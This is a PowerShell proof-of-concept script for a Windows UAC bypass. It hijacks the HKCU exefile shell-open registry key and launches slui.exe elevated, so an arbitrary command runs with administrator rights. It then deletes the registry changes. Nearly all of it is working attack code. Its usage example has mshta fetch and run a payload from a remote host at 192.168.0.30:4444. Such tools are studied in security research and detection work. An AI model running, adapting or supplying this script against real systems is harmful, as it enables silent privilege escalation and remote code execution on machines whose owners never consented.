<#
.SYNOPSIS
    This script is a proof of concept to bypass the User Access Control (UAC) via SluiFileHandlerHijackLPE
.NOTES
    Function   : SluiHijackBypass
    File Name  : SluiHijackBypass.ps1
    Author     : Gushmazuko
.LINK
    https://github.com/gushmazuko/tools/blob/master/SluiHijackBypass.ps1
    Original source: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
.EXAMPLE
    Load "cmd.exe" (By Default used 'arch 64'):
    Invoke-SluiBypass -command "cmd.exe" 
    
    Load "mshta http://192.168.0.30:4444/0HUGN"
    Invoke-SluiBypass -command "mshta http://192.168.0.30:4444/0HUGN"
#>

function Invoke-SluiBypass(){
    Param (

        [Parameter(Mandatory=$True)]
        [String]$command
    )
    
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if(($(whoami /groups) -like "*S-1-5-32-544*").length -eq 0) {
        "[!] Current user not a local administrator!"
            Throw ("Current user not a local administrator!")
    }
    if (($(whoami /groups) -like "*S-1-16-8192*").length -eq 0) {
        "[!] Not in a medium integrity process!"
        Throw ("Not in a medium integrity process!")
    }

    else{
            
        #Create registry structure
        New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
        New-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "DelegateExecute" -Value "" -Force
        Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $command -Force
        
        # Check for the environment and execute the Bypass

        if ( [environment]::Is64BitOperatingSystem -eq "True" ) 
        {
            # x64 shell in Windows x64 | x86 shell in Windows x86
            Start-Process "C:\Windows\System32\slui.exe" -Verb runas
        }
        else
        {
            # x86 shell in Windows x64
            C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\slui.exe -Verb runas"
        }

        #Remove registry structure
        Start-Sleep 3
        Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force

    }
}

